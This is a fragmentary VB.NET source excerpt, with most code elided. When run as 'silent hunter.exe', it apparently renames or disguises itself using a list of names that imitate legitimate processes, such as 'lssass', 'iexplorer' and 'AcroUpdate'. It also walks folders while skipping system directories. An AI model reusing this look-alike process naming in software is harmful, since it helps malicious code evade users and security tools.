...
Public Class Main_Screen
    ...
    'Dim restartonclose As Boolean = False
            ...
            If runApplication = False Then
                If Application.ExecutablePath.ToLower.EndsWith("silent hunter.exe") = True Then
                    Try
                        ...
                        Dim names As String() = New String() {"AcroUpdate", "iexplorer", "FrameworkServ", "WinExp", "SH", "lssass", "AcroRd16", "acrotray1", "LSSSrvc", "iprintlgn", "hkcmb", "realshed", "nwtray1"}

                        Randomize()   ' Initialize random-number generator.
                        Dim MyValue As Integer = CInt(Int((13 * Rnd()) + 1)) ' Generate random value between 1 and 8.
    ...
    Private Sub FolderWalker(ByVal basefolder As String)
        Try
            If Not basefolder.EndsWith("System Volume Information") And Not basefolder.EndsWith("RECYCLER") Then
    ...
    Private Sub backgroundWorker1_DoWork(ByVal sender As Object, ByVal e As DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Try
            ...
            Try
                ...
                Next
            Catch ex As Exception
                Error_Handler(ex, "Background Worker2")
            End Try
